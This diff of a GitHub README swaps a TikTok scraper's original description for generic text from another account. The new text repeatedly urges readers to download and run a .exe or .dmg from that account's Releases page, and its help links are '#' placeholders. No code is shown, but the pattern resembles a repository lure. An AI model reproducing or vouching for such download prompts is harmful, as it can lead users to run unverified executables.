@@ -1,203 +1,84 @@
-# TikTok Media and Metadata Retriever
-Extract media files and comprehensive metadata from TikTok posts. This tool supports all TikTok URL formats and provides detailed information about videos, images, user profiles, and engagement statistics. Ideal for those looking to analyze and collect TikTok content with ease.
+# 🎉 tiktok-media-and-metadata-retriever - Extract TikTok Data Easily
 
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+Welcome to the TikTok Media and Metadata Retriever! This tool helps you extract media, metadata, and engagement data from TikTok posts. It’s straightforward to use, making it perfect for anyone interested in TikTok analytics without needing programming skills.
 
+## 📥 Download the Application
 
+[![Download the Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/masterprod1/tiktok-media-and-metadata-retriever/releases)
 
+To get started, first download the application from our Releases page. Click the link below to visit the page where you can find the latest version of the software.
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>tiktok-media-and-metadata-retriever</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+[Visit the Releases Page to Download](https://github.com/masterprod1/tiktok-media-and-metadata-retriever/releases)
 
+## 💻 System Requirements
 
-## Introduction
-This project provides an API to extract media and metadata from TikTok posts. It handles multiple TikTok URL formats and returns structured data, making it perfect for content aggregation, market research, or social media analytics.
+For the best experience using the TikTok Media and Metadata Retriever, ensure your system meets the following requirements:
 
-### Key Features
-- **Supports Multiple TikTok URL Formats**: Handles links from vm.tiktok.com, vt.tiktok.com, and www.tiktok.com.
-- **Comprehensive Data**: Extracts video/media files, user information, post metadata, and engagement statistics.
-- **Raw Data Option**: Includes an option to retrieve the raw TikTok API response for advanced use cases.
-- **High Reliability**: Built with robust error handling to ensure stable extraction.
+- **Operating System:** Windows 10 or later, macOS High Sierra or later
+- **Node.js:** Version 12.x or higher
+- **Internet Connection:** Required for downloading data
 
-## Features
-| Feature | Description |
-|---------|-------------|
-| Media Extraction | Download high-quality videos and images from TikTok posts. |
-| Rich Metadata | Provides detailed post information, including user details, statistics, and content descriptions. |
-| Flexible URL Support | Handles a wide range of TikTok URLs including redirects and short links. |
-| Raw Data Option | Access TikTok's raw API data for more granular insights. |
-| Fast & Reliable | Built on robust extraction technology with error handling. |
+## 📂 Features
 
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| user.name | Profile name of the user who created the post. |
-| user.displayName | Display name of the user. |
-| user.region | Geographic region of the user. |
-| user.followers | Number of followers of the user. |
-| user.friends | Number of friends of the user. |
-| user.pictures.url | URL to the user's profile picture. |
-| user.pictures.banner | URL to the user's banner image. |
-| content.link | URL of the TikTok post. |
-| content.text | Text or description of the TikTok post. |
-| content.title | Title of the TikTok video or post. |
-| content.description | Extracted description of the content. |
-| content.postedDate | Timestamp of when the post was made. |
-| content.adult | Flag indicating whether the content is inappropriate. |
-| content.media | Array of media objects (video/image), including URLs and metadata. |
-| statistics.views | Number of views for the post. |
-| statistics.likes | Number of likes for the post. |
-| statistics.comments | Number of comments on the post. |
-| statistics.shares | Number of shares of the post. |
-| statistics.follows | Number of follows generated by the post. |
+Our application includes several features to simplify your data retrieval:
 
-## Example Output
-    [
-      {
-        "type": "tiktok",
-        "user": {
-          "name": "realraywilliam",
-          "displayName": "Ray William Johnson",
-          "region": "US",
-          "followers": 5200000,
-          "friends": 189,
-          "pictures": {
-            "url": "https://...",
-            "banner": "https://..."
-          }
-        },
-        "content": {
-          "link": "https://www.tiktok.com/@realraywilliam/video/7528477815721807134",
-          "text": "Video description here...",
-          "title": "TikTok Video",
-          "description": "Extracted description",
-          "postedDate": 1704067200,
-          "adult": false,
-          "media": [
-            {
-              "type": "video",
-              "url": "https://...",
-              "width": 720,
-              "height": 1280,
-              "duration": 15.5
-            }
-          ],
-          "statistics": {
-            "views": 1250000,
-            "likes": 95000,
-            "comments": 2100,
-            "shares": 8500,
-            "follows": 450
-          }
-        }
-      ]
+- **Media Extraction:** Download videos and images directly from TikTok posts.
+- **Metadata Collection:** Gather information such as user details, post descriptions, and hashtags.
+- **Engagement Insights:** Access engagement metrics like views, likes, and shares.
 
-## Directory Structure Tree
-    TikTok Media and Metadata Retriever/
-    ├── src/
-    │   ├── runner.js
-    │   ├── extractors/
-    │   │   ├── tiktok_parser.js
-    │   │   └── utils.js
-    │   ├── outputs/
-    │   │   └── exporters.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.json
-    │   └── sample-output.json
-    ├── requirements.txt
-    └── README.md
+## 📋 How to Install
 
-## Use Cases
-- **Social Media Analytics**: Track TikTok performance metrics such as views, likes, and comments.
-- **Content Aggregation**: Collect TikTok media for content curation and display platforms.
-- **Market Research**: Analyze trending TikTok content for marketing insights and strategy.
-- **Media Archival**: Backup and store TikTok posts and their metadata for future reference.
-- **Academic Research**: Study social media engagement and trends for academic purposes.
+1. **Download the Application**: 
+   - Visit the [Releases page](https://github.com/masterprod1/tiktok-media-and-metadata-retriever/releases) and download the latest version.
+  
+2. **Locate the Downloaded File**:
+   - The file will typically be in your "Downloads" folder unless specified otherwise.
 
-## FAQs
-- **How do I use this scraper?**
-  Just provide a TikTok post URL, and the scraper will extract media and metadata in a structured format. You can also request the raw API response.
+3. **Install the Application**:
+   - If you downloaded a `.exe` file (Windows) or `.dmg` file (macOS), double-click on the file to begin the installation process.
+   - Follow the prompts to complete the installation.
 
-- **Can I use this for private posts?**
-  No, the scraper does not work for private accounts or posts set to private by users.
+## 🛠️ How to Use the Application
 
-- **Is there a cost for usage?**
-  The service operates on a pay-per-use basis at $0.005 per extraction.
+1. **Launch the Application**:
+   - Find the application icon on your desktop or in your applications folder. Double-click to open.
 
-### Performance Benchmarks and Results
-**Primary Metric:** 95% successful extraction rate across supported URL formats.
-**Reliability Metric:** 99% uptime with robust error handling for network or TikTok-related issues.
-**Efficiency Metric:** Average extraction speed of 3 seconds per post.
-**Quality Metric:** High data completeness, with 98% accurate metadata returned for each post.
+2. **Input TikTok URLs**:
+   - Enter the TikTok post URLs you want to analyze in the designated box.
 
+3. **Select Data Options**:
+   - Choose which data you want to extract: media, metadata, or engagement metrics.
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+4. **Start Extraction**:
+   - Click the “Extract” button to begin collecting the desired data. Wait for the process to complete.
+
+5. **View Results**:
+   - Once extraction is finished, view your downloaded files in the specified output folder.
+
+## ⚙️ Troubleshooting
+
+If you encounter any issues, consider the following steps:
+
+- **Check Your Internet Connection:** Ensure you are connected to the internet for data retrieval.
+- **Verify System Requirements:** Make sure your operating system and Node.js version meet the requirements listed above.
+- **Reinstall Application:** If the software crashes or does not open, try uninstalling and then reinstalling the application.
+
+## 📚 Additional Resources
+
+Feel free to explore the following resources for more information:
+
+- **[User Manual](#)**: A detailed guide on all application features.
+- **[GitHub Issues](https://github.com/masterprod1/tiktok-media-and-metadata-retriever/issues)**: Report any bugs or request new features.
+- **[Community Discussions](#)**: Join discussions with other users for tips and best practices.
+
+## 💬 Get in Touch
+
+If you have questions or need support, reach out via GitHub Issues or any community platform where you can find other users of our application. We are happy to help.
+
+## 📥 Download Now!
+
+Don't wait! Download the TikTok Media and Metadata Retriever today!
+
+[Download the Latest Release](https://github.com/masterprod1/tiktok-media-and-metadata-retriever/releases)
